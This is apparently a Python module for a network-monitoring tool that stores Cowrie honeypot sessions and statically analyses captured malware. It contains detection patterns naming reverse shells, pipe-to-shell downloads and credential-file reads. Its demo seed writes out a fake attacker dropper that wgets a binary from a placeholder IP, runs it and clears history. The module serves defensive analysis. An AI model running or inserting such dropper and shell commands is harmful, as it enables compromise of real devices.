# SPDX-License-Identifier: GPL-2.0-or-later
# Copyright (C) 2026 The LanPulse authors
"""
Honeypot session and malware analysis.

A Raspberry Pi running Cowrie (a medium-interaction SSH/Telnet honeypot) sends LanPulse each attacker session
(logins tried, every command typed) and every file the attacker downloaded or uploaded. This module stores them
and explains them: what the commands were trying to do, and what is inside each captured file.

SAFETY: analysis is STATIC ONLY. A captured file is read as bytes and inspected (hashes, file type, printable
strings, addresses and URLs inside it). It is never executed, never opened by an interpreter and never served back
to a browser. It is stored under a hash-only file name in a private folder.
"""
from __future__ import annotations

import hashlib
import ipaddress
import json
import logging
import math
import os
import re
import sqlite3
import secrets
import struct
import threading
import time

log = logging.getLogger("lanpulse.honeyanalysis")

MAX_SAMPLE = 5 * 1024 * 1024          # largest file stored (bytes)
MAX_SAMPLES = 500                      # files kept; the least recently seen are dropped first
MAX_STORE = 300 * 1024 * 1024          # total bytes of stored files
MAX_LOGINS, MAX_CMDS, MAX_CMD_LEN, MAX_FILES = 200, 300, 1000, 20
RETENTION_DAYS = 90

# ------------------------------------------------------------------ small helpers
HEX64 = re.compile(r"^[0-9a-f]{64}$")


def defang(s: str) -> str:
    """Make a URL or address harmless to read and copy: hxxp://evil[.]com"""
    s = re.sub(r"^(\w+)://", lambda m: m.group(1).replace("t", "x", 2) + "://" if m.group(1).lower() in ("http", "https") else m.group(0), s)
    return s.replace(".", "[.]")


def entropy(data: bytes) -> float:
    """Shannon entropy in bits per byte (0 to 8). Above about 7.2 usually means packed or encrypted."""
    if not data:
        return 0.0
    counts = [0] * 256
    for b in data:
        counts[b] += 1
    n = len(data)
    return round(-sum(c / n * math.log2(c / n) for c in counts if c), 2)


def hashes(data: bytes) -> dict:
    return {"md5": hashlib.md5(data).hexdigest(), "sha1": hashlib.sha1(data).hexdigest(),
            "sha256": hashlib.sha256(data).hexdigest()}


def printable_strings(data: bytes, min_len: int = 6, limit: int = 400, max_total: int = 40000) -> list[str]:
    out, total = [], 0
    for m in re.finditer(rb"[\x20-\x7e]{%d,}" % min_len, data):
        s = m.group().decode("ascii")[:300]
        out.append(s)
        total += len(s)
        if len(out) >= limit or total >= max_total:
            break
    return out


# ------------------------------------------------------------------ file type
ELF_MACHINES = {2: "SPARC", 3: "x86", 4: "m68k", 8: "MIPS", 20: "PowerPC", 21: "PowerPC64", 22: "S390", 40: "ARM",
                42: "SuperH", 50: "IA-64", 62: "x86-64", 183: "AArch64", 243: "RISC-V"}


def identify(data: bytes) -> dict:
    """What kind of file this is, from its first bytes. Returns {kind, detail}."""
    head = data[:4096]
    if data[:4] == b"\x7fELF" and len(data) >= 64:
        try:
            bits = 64 if data[4] == 2 else 32
            end = "<" if data[5] == 1 else ">"
            machine = struct.unpack(end + "H", data[18:20])[0]
            if bits == 64:
                phoff, = struct.unpack(end + "Q", data[32:40])
                phentsize, phnum = struct.unpack(end + "HH", data[54:58])
                shnum, = struct.unpack(end + "H", data[60:62])
            else:
                phoff, = struct.unpack(end + "I", data[28:32])
                phentsize, phnum = struct.unpack(end + "HH", data[42:46])
                shnum, = struct.unpack(end + "H", data[48:50])
            dynamic = False
            for i in range(min(phnum, 64)):
                o = phoff + i * phentsize
                if o + 4 <= len(data) and struct.unpack(end + "I", data[o:o + 4])[0] == 3:    # PT_INTERP
                    dynamic = True
                    break
            arch = ELF_MACHINES.get(machine, f"machine {machine}")
            bits_txt = f"{bits}-bit {'little' if end == '<' else 'big'}-endian"
            link = "dynamically linked" if dynamic else "statically linked"
            extra = ", no section headers (stripped or packed)" if shnum == 0 else ""
            return {"kind": "elf", "detail": f"Linux ELF program, {arch}, {bits_txt}, {link}{extra}",
                    "arch": arch, "static": not dynamic}
        except (struct.error, IndexError):
            return {"kind": "elf", "detail": "Linux ELF program (damaged header)", "arch": "", "static": False}
    if data[:2] == b"MZ":
        pe = struct.unpack("<I", data[0x3c:0x40])[0] if len(data) >= 0x40 else 0
        if pe and data[pe:pe + 4] == b"PE\x00\x00":
            return {"kind": "pe", "detail": "Windows program (PE)"}
        return {"kind": "pe", "detail": "DOS/Windows program (MZ)"}
    if data[:2] == b"\x1f\x8b":
        return {"kind": "archive", "detail": "gzip compressed data"}
    if data[:4] == b"PK\x03\x04":
        return {"kind": "archive", "detail": "ZIP archive"}
    if data[:3] == b"BZh":
        return {"kind": "archive", "detail": "bzip2 compressed data"}
    if data[:6] == b"\xfd7zXZ\x00":
        return {"kind": "archive", "detail": "xz compressed data"}
    if data[257:262] == b"ustar":
        return {"kind": "archive", "detail": "tar archive"}
    if data[:2] == b"#!":
        line = data[:120].split(b"\n", 1)[0].decode("latin-1", "replace")
        return {"kind": "script", "detail": f"script ({line.strip()[:60]})"}
    text = sum(1 for b in head if b in (9, 10, 13) or 32 <= b < 127)
    if head and text / len(head) > 0.92:
        low = head.decode("latin-1", "replace").lower()
        if re.search(r"<\?php|<html|<script", low):
            return {"kind": "web", "detail": "web page or PHP script"}
        if re.search(r"\b(import |def |print\()", low) and "python" in low or low.startswith("import "):
            return {"kind": "script", "detail": "Python script"}
        if re.search(r"\b(wget|curl|chmod|echo|cd |rm |export |for |if \[|busybox)\b", low):
            return {"kind": "script", "detail": "shell script"}
        return {"kind": "text", "detail": "text file"}
    return {"kind": "data", "detail": "unrecognized binary data"}


# ------------------------------------------------------------------ indicators inside text
RE_URL = re.compile(r"(?:https?|ftp|tftp|stratum\+tcp|stratum\+ssl)://[^\s'\"<>\\|;()`{}]{4,200}", re.I)
RE_IP = re.compile(r"(?<![\d.])(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)(?![\d.])")
RE_DOMAIN = re.compile(r"\b(?:[a-z0-9][a-z0-9-]{0,40}\.)+(?:com|net|org|ru|cn|xyz|top|info|io|biz|cc|tk|pw|su|me|co|in|de|uk|nl|fr|br|ir|kr|jp|online|site|club|icu|shop|live|today|pro|ws|to)\b", re.I)
RE_EMAIL = re.compile(r"\b[a-z0-9._%+-]{2,40}@[a-z0-9.-]{3,60}\.[a-z]{2,10}\b", re.I)
RE_XMR = re.compile(r"\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b")
RE_BTC = re.compile(r"\b(?:bc1[a-z0-9]{25,60}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b")
RE_SSHKEY = re.compile(r"ssh-(?:rsa|ed25519|dss) AAAA[0-9A-Za-z+/=]{20,}(?: [\w@.\-]{1,40})?")


def _public_ip(s: str) -> bool:
    try:
        a = ipaddress.ip_address(s)
    except ValueError:
        return False
    return not (a.is_private or a.is_loopback or a.is_multicast or a.is_unspecified or a.is_reserved or a.is_link_local)


def find_iocs(text: str, limit: int = 40) -> dict:
    """URLs, public IPs, domains, e-mails, wallets and SSH keys mentioned in a block of text."""
    def uniq(seq):
        seen, out = set(), []
        for x in seq:
            if x not in seen:
                seen.add(x)
                out.append(x)
        return out[:limit]

    urls = uniq(m.group().rstrip(".,)") for m in RE_URL.finditer(text))
    url_hosts = {re.sub(r"^\w+(?:\+\w+)?://([^/:]+).*", r"\1", u) for u in urls}
    ips = uniq(m.group() for m in RE_IP.finditer(text) if _public_ip(m.group()))
    doms = uniq(m.group().lower() for m in RE_DOMAIN.finditer(text)
                if not re.fullmatch(r"[\d.]+", m.group()))
    return {
        "urls": [{"value": u, "defanged": defang(u)} for u in urls],
        "ips": [{"value": i, "defanged": defang(i)} for i in ips],
        "domains": [{"value": d, "defanged": defang(d)} for d in doms if d not in url_hosts][:limit],
        "emails": uniq(m.group() for m in RE_EMAIL.finditer(text)),
        "wallets": uniq([("Monero " + m.group()) for m in RE_XMR.finditer(text)] +
                        [("Bitcoin " + m.group()) for m in RE_BTC.finditer(text)]),
        "ssh_keys": uniq(m.group()[:120] + ("…" if len(m.group()) > 120 else "") for m in RE_SSHKEY.finditer(text)),
    }


# ------------------------------------------------------------------ what commands are trying to do
# (tag, label, MITRE ATT&CK technique, severity weight, pattern)
CMD_RULES = [
    ("download", "Downloads a file", "T1105", 25, r"\b(wget|curl|tftp|ftpget|ftp)\b.*(://|\s\d+\.\d+\.\d+\.\d+)|\btftp\s+-"),
    ("pipe-to-shell", "Pipes a download straight into a shell", "T1059.004", 35, r"\b(curl|wget)\b[^|;]*\|\s*(sudo\s+)?(ba|da)?sh\b"),
    ("make-executable", "Makes a file executable", "T1222.002", 15, r"\bchmod\s+(?:[ugoa]*\+x|[0-7]{3,4})\b"),
    ("run-dropped-file", "Runs a file it just wrote", "T1059.004", 20, r"(?:^|[;&|]\s*|\s)(?:\./[\w.\-]+|sh\s+[\w./\-]+\.sh|bash\s+[\w./\-]+)(?:\s|$|;)"),
    ("reverse-shell", "Opens a reverse shell", "T1059.004", 40, r"/dev/tcp/|\bnc(?:at)?\b[^;|]*\s-e\b|bash\s+-i\s*>?&|\bmkfifo\b|socket\.socket.*connect"),
    ("persistence-cron", "Installs a scheduled task", "T1053.003", 25, r"\bcrontab\b(?!\s+-l\b)|/etc/cron|/var/spool/cron"),
    ("persistence-startup", "Adds itself to startup", "T1546", 25, r"rc\.local|/etc/init\.d|systemctl\s+enable|\.bashrc|\.profile|ld\.so\.preload"),
    ("ssh-key-plant", "Plants its own SSH key", "T1098.004", 35, r"authorized_keys"),
    ("account-change", "Creates or changes accounts and passwords", "T1136.001", 25, r"\b(useradd|adduser|usermod|chpasswd|passwd)\b"),
    ("recon", "Looks around the system", "T1082", 5, r"\b(uname|lscpu|nproc|hostname|whoami|lspci|lsb_release|free\s+-[mgh]|df\s+-h|uptime)\b|/proc/(cpuinfo|meminfo|version)|/etc/(passwd|issue|os-release|shadow)"),
    ("recon-network", "Looks at the network setup", "T1016", 5, r"\b(ifconfig|ip\s+(a|addr|route)|netstat|ss\s+-|arp\s+-a)\b|/proc/net"),
    ("miner", "Cryptocurrency mining", "T1496", 40, r"xmrig|minerd|cpuminer|stratum\+|kdevtmpfsi|kinsing|--donate-level|randomx"),
    ("kill-processes", "Kills other processes (often rival malware)", "T1489", 15, r"\b(pkill|killall|kill\s+-9|xargs\s+kill)\b"),
    ("disable-defenses", "Turns off security tools", "T1562.001", 30, r"ufw\s+disable|setenforce\s+0|iptables\s+-F|service\s+\w*(firewall|apparmor|selinux)\w*\s+stop|systemctl\s+(stop|disable)\s+\w*(firewall|apparmor|auditd)|chattr\s+-i"),
    ("cover-tracks", "Erases its tracks", "T1070.003", 25, r"history\s+-c|unset\s+HISTFILE|HISTSIZE=0|HISTFILE=/dev/null|rm\s+-r?f?\s+[^;]*(/var/log|\.bash_history)|>\s*/var/log|\bshred\b"),
    ("iot-botnet-probe", "Probes for a router or IoT shell (botnet style)", "T1059.004", 20,
     r"busybox\s+[A-Za-z]{3,10}\b|^(enable|system|shell|linuxshell|sh)$|/bin/busybox"),
    ("deletes-files", "Deletes files", "T1070.004", 10, r"\brm\s+-[a-z]*r[a-z]*f?\s+\S+|\brm\s+-f\s+\S+"),
]
_CMD_RULES = [(t, lab, att, w, re.compile(p, re.I | re.M)) for t, lab, att, w, p in CMD_RULES]
TAG_INFO = {t: {"label": lab, "attack": att, "weight": w} for t, lab, att, w, _ in CMD_RULES}


def classify_command(cmd: str) -> list[str]:
    cmd = cmd.strip()
    return [t for t, _, _, _, rx in _CMD_RULES if rx.search(cmd)]


def analyze_commands(cmds: list[str]) -> dict:
    """Tag each typed command, then summarise the session."""
    rows, tags, urls = [], {}, []
    for c in cmds[:MAX_CMDS]:
        c = str(c)[:MAX_CMD_LEN]
        t = classify_command(c)
        rows.append({"cmd": c, "tags": t})
        for x in t:
            tags[x] = tags.get(x, 0) + 1
    joined = "\n".join(r["cmd"] for r in rows)
    iocs = find_iocs(joined)
    score = min(100, sum(TAG_INFO[t]["weight"] for t in tags))
    return {"commands": rows, "tags": sorted(tags, key=lambda t: -TAG_INFO[t]["weight"]), "iocs": iocs, "score": score}


# ------------------------------------------------------------------ what a captured file is
# (label, pattern over the file's printable strings). These are hints, not a verdict.
FAMILY_HINTS = [
    ("Mirai-style IoT botnet", r"mirai|/dev/watchdog|/dev/misc/watchdog|TSource Engine Query|LCOGQGPTGP|dvrHelper|/bin/busybox"),
    ("Gafgyt / Bashlite-style botnet", r"gafgyt|bashlite|lizkebab|torlus|qbot|BOTKILL|PING.*PONG"),
    ("Cryptocurrency miner", r"xmrig|stratum\+|cpuminer|randomx|--donate-level|monero|minerd"),
    ("Mining dropper / cleaner script", r"kdevtmpfsi|kinsing|\.ICEauth|ld\.so\.preload"),
    ("DDoS tool", r"(udp|syn|ack|http|dns)[ _-]?flood|\bddos\b|\battack_method"),
    ("SSH brute-forcer / worm", r"sshpass|libssh|zmap|masscan|\bhydra\b|authorized_keys"),
    ("Reverse shell / backdoor", r"/dev/tcp/|reverse.?shell|bindshell|nc -e|\bmkfifo\b"),
]
_FAMILY = [(lab, re.compile(p, re.I)) for lab, p in FAMILY_HINTS]


def analyze_sample(data: bytes) -> dict:
    """Static look at one captured file. Never runs it."""
    h = hashes(data)
    ident = identify(data)
    ent = entropy(data)
    strs = printable_strings(data)
    blob = "\n".join(strs)
    notes, families = [], []
    if ent >= 7.2 and ident["kind"] in ("elf", "pe", "data"):
        notes.append(f"High entropy ({ent}): the file is probably packed or encrypted, so most of its strings are hidden.")
    if b"UPX!" in data[:4096] or b"UPX!" in data[-4096:]:
        notes.append("Packed with UPX (a common packer for small malware).")
    if ident["kind"] == "elf" and ident.get("static"):
        notes.append("Statically linked: it carries its own libraries, typical of malware built to run on any router or camera.")
    if ident["kind"] == "elf" and len(data) < 200_000 and ident.get("arch") in ("MIPS", "ARM", "SuperH", "PowerPC", "m68k", "SPARC"):
        notes.append(f"Built for {ident['arch']}: aimed at routers and IoT devices rather than PCs.")
    for lab, rx in _FAMILY:
        if rx.search(blob):
            families.append(lab)
    script_tags = {}
    if ident["kind"] in ("script", "text", "web"):
        text = data[:200_000].decode("latin-1", "replace")
        lines = [ln for ln in text.splitlines() if ln.strip() and not ln.strip().startswith("#")][:MAX_CMDS]
        ca = analyze_commands(lines)
        script_tags = {"tags": ca["tags"], "score": ca["score"]}
    tags = list(script_tags.get("tags", []))
    if families and not any(t == "miner" for t in tags) and any("miner" in f.lower() for f in families):
        tags.append("miner")
    score = script_tags.get("score", 0)
    if ident["kind"] in ("elf", "pe"):
        score = max(score, 40)
    if families:
        score = min(100, score + 25)
    if ent >= 7.2:
        score = min(100, score + 10)
    return {**h, "size": len(data), "kind": ident["kind"], "type": ident["detail"], "arch": ident.get("arch", ""),
            "entropy": ent, "families": families, "notes": notes, "tags": tags, "score": score,
            "iocs": find_iocs(blob), "strings": strs[:150]}


# ------------------------------------------------------------------ storage
class HoneyAnalysis:
    def __init__(self, nm, hp):
        self.nm, self.hp = nm, hp
        self.demo = bool(getattr(nm.args, "demo", False))
        d = nm.data_dir
        self.db = sqlite3.connect(str(d / ("demo-honeypot-sessions.db" if self.demo else "honeypot-sessions.db")),
                                  check_same_thread=False)
        self.db.execute("""CREATE TABLE IF NOT EXISTS sessions (
            id TEXT PRIMARY KEY, sensor TEXT, ip TEXT, port INTEGER, proto TEXT, start REAL, end REAL,
            client TEXT, hassh TEXT, logins TEXT, commands TEXT, files TEXT, tags TEXT, score INTEGER)""")
        self.db.execute("CREATE INDEX IF NOT EXISTS sess_t ON sessions(start)")
        self.db.execute("CREATE INDEX IF NOT EXISTS sess_ip ON sessions(ip)")
        self.db.execute("""CREATE TABLE IF NOT EXISTS samples (
            sha256 TEXT PRIMARY KEY, md5 TEXT, sha1 TEXT, size INTEGER, kind TEXT, type TEXT, entropy REAL,
            first_seen REAL, last_seen REAL, seen INTEGER, ips TEXT, urls TEXT, names TEXT, analysis TEXT, stored INTEGER)""")
        self.db.commit()
        self.lock = threading.Lock()
        self.dir = d / ("demo-honeypot-samples" if self.demo else "honeypot-samples")
        try:
            self.dir.mkdir(mode=0o700, exist_ok=True)
            os.chmod(self.dir, 0o700)
        except OSError:
            log.warning("could not create the honeypot sample folder", exc_info=True)
        try:
            self.prune()
        except Exception:
            log.debug("session prune skipped", exc_info=True)

    # -------------------------------------------------------- auth
    def key_ok(self, key: str) -> bool:
        want = self.hp.cfg.get("ingest_key")
        return bool(want) and secrets.compare_digest(str(key).encode(), str(want).encode())

    # -------------------------------------------------------- ingest
    @staticmethod
    def _clean_str(x, n) -> str:
        return "".join(c for c in str(x if x is not None else "")[:n] if c == "\t" or c >= " " and c != "\x7f")

    def add_session(self, p: dict, quiet: bool = False) -> tuple[bool, str]:
        sid = re.sub(r"[^A-Za-z0-9_-]", "", str(p.get("session") or ""))[:40]
        ip = str(p.get("ip") or "").strip()[:45]
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            return False, "bad ip"
        if not sid:
            return False, "bad session id"
        proto = "telnet" if str(p.get("proto") or "").lower() == "telnet" else "ssh"
        try:
            port = int(p.get("port") or 0)
            start = float(p.get("start") or time.time())
            end = float(p.get("end") or start)
        except (TypeError, ValueError):
            return False, "bad number"
        now = time.time()
        start = min(start, now + 60)
        end = max(start, min(end, now + 60))
        sensor = self._clean_str(p.get("sensor") or "pi-cowrie", 40)
        logins = []
        for x in (p.get("logins") or [])[:MAX_LOGINS]:
            if isinstance(x, dict):
                logins.append({"u": self._clean_str(x.get("u"), 64), "p": self._clean_str(x.get("p"), 64), "ok": bool(x.get("ok"))})
        cmds = [self._clean_str(c, MAX_CMD_LEN) for c in (p.get("commands") or [])[:MAX_CMDS] if isinstance(c, str)]
        files = []
        for f in (p.get("files") or [])[:MAX_FILES]:
            if isinstance(f, dict) and HEX64.match(str(f.get("sha256") or "").lower()):
                files.append({"sha256": f["sha256"].lower(), "url": self._clean_str(f.get("url"), 300),
                              "name": self._clean_str(f.get("name"), 120), "dir": "upload" if f.get("dir") == "upload" else "download"})
        ca = analyze_commands(cmds)
        tags = list(ca["tags"])
        if any(x["ok"] for x in logins):
            tags.insert(0, "logged-in")
        score = min(100, ca["score"] + (20 if any(x["ok"] for x in logins) else 0) + (15 if files else 0))
        with self.lock:
            exists = self.db.execute("SELECT 1 FROM sessions WHERE id=?", (sid,)).fetchone()
            self.db.execute("INSERT OR REPLACE INTO sessions VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                            (sid, sensor, ip, port, proto, start, end, self._clean_str(p.get("client"), 120),
                             self._clean_str(p.get("hassh"), 40), json.dumps(logins), json.dumps(cmds), json.dumps(files),
                             json.dumps(tags), score))
            self.db.commit()
        if not exists and not quiet:     # the first time we see a session it also becomes a headline hit for the dashboard
            first = next((x for x in logins), None)
            creds = f"{first['u']} / {first['p']}" if first else ""
            bits = [f"{len(logins)} login{'' if len(logins) == 1 else 's'}"]
            if cmds:
                bits.append(f"{len(cmds)} command{'' if len(cmds) == 1 else 's'}")
            if files:
                bits.append(f"{len(files)} file{'' if len(files) == 1 else 's'}")
            try:
                self.hp.record(ip, proto, port, creds, "session: " + ", ".join(bits), sensor)
            except Exception:
                log.exception("could not record the session headline")
        return True, "ok"

    def add_sample(self, data: bytes, meta: dict, quiet: bool = False) -> tuple[bool, str]:
        if not data:
            return False, "empty"
        if len(data) > MAX_SAMPLE:
            return False, "too large"
        a = analyze_sample(data)
        sha = a["sha256"]
        ip = str(meta.get("ip") or "")[:45]
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            ip = ""
        url = self._clean_str(meta.get("url"), 300)
        name = self._clean_str(meta.get("name"), 120)
        now = time.time()
        stored = 0
        path = self.dir / sha
        try:
            if not path.exists():
                tmp = self.dir / (sha + ".tmp")
                fd = os.open(str(tmp), os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
                with os.fdopen(fd, "wb") as f:
                    f.write(data)
                os.replace(tmp, path)
            stored = 1
        except OSError:
            log.warning("could not store a captured file", exc_info=True)
        with self.lock:
            row = self.db.execute("SELECT seen, ips, urls, names, first_seen FROM samples WHERE sha256=?", (sha,)).fetchone()
            if row:
                seen = row[0] + 1
                ips = sorted(set(json.loads(row[1] or "[]")) | ({ip} if ip else set()))[:30]
                urls = sorted(set(json.loads(row[2] or "[]")) | ({url} if url else set()))[:30]
                names = sorted(set(json.loads(row[3] or "[]")) | ({name} if name else set()))[:30]
                first = row[4]
            else:
                seen, ips, urls, names, first = 1, [ip] if ip else [], [url] if url else [], [name] if name else [], now
            self.db.execute("INSERT OR REPLACE INTO samples VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                            (sha, a["md5"], a["sha1"], a["size"], a["kind"], a["type"], a["entropy"], first, now, seen,
                             json.dumps(ips), json.dumps(urls), json.dumps(names), json.dumps(a), stored))
            self.db.commit()
        if not row and not quiet:
            try:
                self.nm.notify_plain("local_threats", f"pot-sample-{sha[:16]}", "Honeypot captured a new malware sample",
                                     f"{a['type']} ({a['size']} bytes), sha256 {sha[:16]}…"
                                     + (f", from {defang(url)}" if url else ""), 3)
            except Exception:
                log.debug("sample alert failed", exc_info=True)
        self._prune_files()
        return True, sha

    def _prune_files(self):
        try:
            with self.lock:
                rows = self.db.execute("SELECT sha256, size FROM samples WHERE stored=1 ORDER BY last_seen DESC").fetchall()
                total, keep = 0, 0
                drop = []
                for sha, size in rows:
                    total += size
                    keep += 1
                    if keep > MAX_SAMPLES or total > MAX_STORE:
                        drop.append(sha)
                for sha in drop:
                    try:
                        (self.dir / sha).unlink()
                    except OSError:
                        pass
                    self.db.execute("UPDATE samples SET stored=0 WHERE sha256=?", (sha,))
                if drop:
                    self.db.commit()
        except Exception:
            log.debug("sample prune failed", exc_info=True)

    def prune(self):
        cut = time.time() - int(self.hp.cfg.get("retention_days") or RETENTION_DAYS) * 86400
        with self.lock:
            self.db.execute("DELETE FROM sessions WHERE start < ?", (cut,))
            self.db.commit()

    # -------------------------------------------------------- views
    def sessions(self, hours: int = 168, limit: int = 100) -> dict:
        since = time.time() - hours * 3600
        with self.lock:
            rows = self.db.execute("SELECT id, sensor, ip, port, proto, start, end, client, logins, commands, files, tags, score "
                                   "FROM sessions WHERE start >= ? ORDER BY start DESC LIMIT ?", (since, limit)).fetchall()
            total = self.db.execute("SELECT COUNT(*) FROM sessions WHERE start >= ?", (since,)).fetchone()[0]
        out = []
        for sid, sensor, ip, port, proto, start, end, client, logins, cmds, files, tags, score in rows:
            lg, cm, fl = json.loads(logins or "[]"), json.loads(cmds or "[]"), json.loads(files or "[]")
            g = self.hp._geo(ip)
            out.append({"id": sid, "sensor": sensor, "ip": ip, "port": port, "proto": proto, "start": start,
                        "duration": round(max(0, end - start), 1), "client": client, "logins": len(lg),
                        "logged_in": any(x.get("ok") for x in lg), "commands": len(cm), "files": len(fl),
                        "tags": json.loads(tags or "[]"), "score": score,
                        "iso": g["iso"], "country": g["country"], "city": g["city"]})
        return {"sessions": out, "total": total, "hours": hours, "tag_info": TAG_INFO}

    def session(self, sid: str) -> dict | None:
        with self.lock:
            r = self.db.execute("SELECT id, sensor, ip, port, proto, start, end, client, hassh, logins, commands, files, tags, score "
                                "FROM sessions WHERE id=?", (sid,)).fetchone()
        if not r:
            return None
        sid, sensor, ip, port, proto, start, end, client, hassh, logins, cmds, files, tags, score = r
        cmds = json.loads(cmds or "[]")
        ca = analyze_commands(cmds)
        files = json.loads(files or "[]")
        for f in files:
            with self.lock:
                s = self.db.execute("SELECT type, size FROM samples WHERE sha256=?", (f["sha256"],)).fetchone()
            f["known"] = bool(s)
            f["type"], f["size"] = (s[0], s[1]) if s else ("", 0)
            f["url_defanged"] = defang(f["url"]) if f.get("url") else ""
        return {"id": sid, "sensor": sensor, "ip": ip, "port": port, "proto": proto, "start": start,
                "duration": round(max(0, end - start), 1), "client": client, "hassh": hassh,
                "logins": json.loads(logins or "[]"), "commands": ca["commands"], "iocs": ca["iocs"],
                "files": files, "tags": json.loads(tags or "[]"), "score": score, "tag_info": TAG_INFO,
                **{k: v for k, v in self.hp._geo(ip).items() if k in ("iso", "country", "city", "org", "asn")}}

    def samples(self, limit: int = 100) -> dict:
        with self.lock:
            rows = self.db.execute("SELECT sha256, size, kind, type, first_seen, last_seen, seen, analysis FROM samples "
                                   "ORDER BY last_seen DESC LIMIT ?", (limit,)).fetchall()
            total = self.db.execute("SELECT COUNT(*) FROM samples").fetchone()[0]
        out = []
        for sha, size, kind, typ, first, last, seen, an in rows:
            a = json.loads(an or "{}")
            out.append({"sha256": sha, "size": size, "kind": kind, "type": typ, "first_seen": first, "last_seen": last,
                        "seen": seen, "families": a.get("families", []), "tags": a.get("tags", []), "score": a.get("score", 0)})
        return {"samples": out, "total": total}

    def sample(self, sha: str) -> dict | None:
        sha = str(sha).lower()
        if not HEX64.match(sha):
            return None
        with self.lock:
            r = self.db.execute("SELECT first_seen, last_seen, seen, ips, urls, names, analysis, stored FROM samples WHERE sha256=?",
                                (sha,)).fetchone()
            sess = self.db.execute("SELECT id, ip, start FROM sessions WHERE files LIKE ? ORDER BY start DESC LIMIT 20",
                                   (f"%{sha}%",)).fetchall()
        if not r:
            return None
        first, last, seen, ips, urls, names, an, stored = r
        a = json.loads(an or "{}")
        urls = json.loads(urls or "[]")
        return {**a, "first_seen": first, "last_seen": last, "seen": seen, "ips": json.loads(ips or "[]"),
                "urls": [{"value": u, "defanged": defang(u)} for u in urls], "names": json.loads(names or "[]"),
                "stored": bool(stored), "sessions": [{"id": i, "ip": ip, "start": t} for i, ip, t in sess],
                "vt_link": f"https://www.virustotal.com/gui/file/{sha}"}

    # -------------------------------------------------------- demo
    def seed_demo(self):
        with self.lock:
            if self.db.execute("SELECT COUNT(*) FROM sessions").fetchone()[0]:
                return
        now = time.time()
        script = (b"#!/bin/sh\ncd /tmp || cd /var/run\nwget http://203.0.113.50/bins/arm7 -O .x\nchmod +x .x\n./.x telnet.exploit\n"
                  b"rm -f .x\nhistory -c\n")
        elf = (b"\x7fELF\x01\x01\x01" + b"\x00" * 9 + b"\x02\x00\x28\x00" + b"\x00" * 44 +
               b"/bin/busybox\x00/dev/watchdog\x00stratum+tcp://pool.example.invalid:3333\x00" + b"\x00" * 64)
        ok1, s1 = self.add_sample(script, {"ip": "198.51.100.23", "url": "http://203.0.113.50/bins/sh", "name": "update.sh"}, quiet=True)
        ok2, s2 = self.add_sample(elf, {"ip": "198.51.100.23", "url": "http://203.0.113.50/bins/arm7", "name": ".x"}, quiet=True)
        self.add_session({"session": "demo0001", "sensor": "pi-cowrie", "ip": "198.51.100.23", "port": 22, "proto": "ssh",
                          "start": now - 3 * 3600, "end": now - 3 * 3600 + 74, "client": "SSH-2.0-Go",
                          "logins": [{"u": "root", "p": "root", "ok": False}, {"u": "root", "p": "123456", "ok": True}],
                          "commands": ["uname -a", "cat /proc/cpuinfo | grep name | wc -l", "cd /tmp; wget http://203.0.113.50/bins/sh -O update.sh",
                                       "chmod +x update.sh", "./update.sh", "crontab -l", "history -c"],
                          "files": [{"sha256": s1, "url": "http://203.0.113.50/bins/sh", "name": "update.sh"},
                                    {"sha256": s2, "url": "http://203.0.113.50/bins/arm7", "name": ".x"}] if ok1 and ok2 else []}, quiet=True)
        self.add_session({"session": "demo0002", "sensor": "pi-cowrie", "ip": "192.0.2.77", "port": 23, "proto": "telnet",
                          "start": now - 26 * 3600, "end": now - 26 * 3600 + 9, "client": "",
                          "logins": [{"u": "admin", "p": "admin", "ok": False}, {"u": "root", "p": "xc3511", "ok": True}],
                          "commands": ["enable", "system", "shell", "sh", "/bin/busybox MIRAI"], "files": []}, quiet=True)
